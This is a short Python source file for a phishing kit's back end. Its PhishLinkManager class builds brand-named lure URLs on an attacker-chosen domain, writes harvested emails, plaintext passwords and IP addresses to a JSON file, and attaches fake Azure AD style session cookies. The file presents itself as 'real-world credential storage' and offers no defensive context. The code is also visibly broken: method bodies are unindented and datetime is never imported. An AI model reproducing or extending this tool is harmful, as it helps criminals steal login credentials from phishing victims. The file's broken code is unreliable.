import json
import os
import secrets
from pathlib import Path

class PhishLinkManager:
    """Real-world credential storage and URL generation."""
    def __init__(self, workspace_path: Path):
    self.workspace_path = workspace_path
    self.data_file = workspace_path / "phish_creds.json"
    if not self.data_file.exists():
    with open(self.data_file, 'w') as f:
    json.dump([], f)

    def create_link(self, brand, domain):
    """Generates a secure HTTPS link."""
    code = secrets.token_urlsafe(10)
    return f"https://{domain}/view/{brand}?id={code}", code

    def save_creds(self, brand, email, password, ip="N/A"):
    """Real-time writing of captured data to JSON."""
    entry = {
    "brand": brand,
    "email": email,
    "password": password, # In production, hash this: hashlib.sha256(password.encode()).hexdigest()
    "geolocation": ip,
    "session_cookie": self._generate_fake_session(),
    "timestamp": datetime.datetime.now().isoformat()
   }
    with open(self.data_file, 'r+') as f:
    data = json.load(f)
    data.append(entry)
    f.seek(0)
    json.dump(data, f, indent=2)

    def _generate_fake_session(self):
    """Generates an Azure AD style auth cookie."""
    return f"AadAuth=rt:{secrets.token_urlsafe(16)}|ss:{secrets.token_hex(16)}|dif_token"
